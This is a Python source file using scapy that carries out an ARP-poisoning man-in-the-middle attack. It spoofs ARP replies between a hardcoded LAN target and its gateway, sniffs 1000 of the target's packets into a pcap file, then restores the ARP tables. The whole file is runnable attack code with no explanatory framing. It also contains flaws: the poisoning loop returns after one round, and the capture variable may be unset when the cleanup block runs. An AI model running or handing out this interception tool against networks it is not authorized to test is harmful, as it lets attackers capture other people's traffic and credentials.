from __future__ import print_function

from scapy.all import *
import sys
import threading


from scapy.layers.l2 import ARP, Ether

target_ip       = "192.168.1.169"
gateway_ip      = "192.168.1.1"
packet_count    = 1000
poisoning       = True

# turn off output
conf.verb = 0


def restore_target(g_ip, g_mac, t_ip, t_mac):
    # Slightly different method using send
    print("[*] Restoring target...")
    send(ARP(op=2, psrc=g_ip, pdst=t_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=g_mac), count=5)
    send(ARP(op=2, psrc=t_ip, pdst=g_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=t_mac), count=5)


def get_mac(ip_address):
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)

    # Return the MAC address from a response
    for s, r in responses:
        return r[Ether].src

    return None


def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    global poisoning

    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print("[*] Beginning the ARP poison. [CTRL-C] to stop]")

    while poisoning:
        send(poison_target)
        send(poison_gateway)

        time.sleep(2)

        print("[*] ARP poison attack finished")

        return


gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print("[!!!] Failed to get gateway MAC; Exiting.")
    sys.exit(0)
else:
    print("[*] Gateway {} is at {}".format(gateway_ip, gateway_mac))

target_mac = get_mac(target_ip)

if target_mac is None:
    print("[!!!] Failed to get target MAC; Exiting.")
    sys.exit(0)
else:
    print("[*] Target {} is at {}".format(target_ip, target_mac))

# Start poison thread
poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

try:
    print("[*] Starting sniffer for {} packets".format(packet_count))

    bpf_filter = "ip host " + target_ip
    packets = sniff(count=packet_count, filter=bpf_filter, iface=conf.iface)

except (KeyboardInterrupt, SystemExit):
    # Restore the network
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)

finally:
    # Write out the captured packets
    print("[*] Writing packets to arper.pcap")
    wrpcap("arper.pcap", packets)

    poisoning = False

    # Wait for poisoning thread to exit
    time.sleep(2)

    # Restore the network
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)
